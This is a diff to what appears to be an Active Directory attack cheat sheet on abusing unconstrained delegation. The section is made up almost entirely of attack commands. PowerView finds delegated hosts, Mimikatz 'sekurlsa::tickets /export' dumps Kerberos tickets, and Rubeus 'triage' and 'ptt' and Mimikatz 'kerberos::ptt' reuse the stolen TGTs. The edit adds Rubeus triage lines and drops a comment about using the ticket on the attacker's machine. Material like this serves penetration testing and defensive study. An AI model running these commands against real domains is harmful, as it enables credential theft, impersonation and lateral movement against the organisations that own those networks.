@@ -533,13 +533,17 @@ Get-DomainComputer -UnConstrained | select samaccountname
 Invoke-Mimikatz -Command '"sekurlsa::tickets"'
 ```
 
+```
+.\Rubeus.exe triage
+```
+
 #### Export the TGT ticket
 ```
 Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 ```
 
 ```
-.\Rubeus.exe monitor /interval:5
+.\Rubeus.exe triage /luid:<LUID> /service:<SERVICE>
 ```
 
 #### Reuse the TGT ticket
@@ -548,7 +552,6 @@ Invoke-Mimikatz -Command '"kerberos::ptt <KIRBI FILE>"'
 ```
 
 ```
-# Copy the base64 encoded TGT, remove extra spaces and use it on the attacker' machine:
 .\Rubeus.exe ptt /ticket:<TICKET FILE>
 ```
 
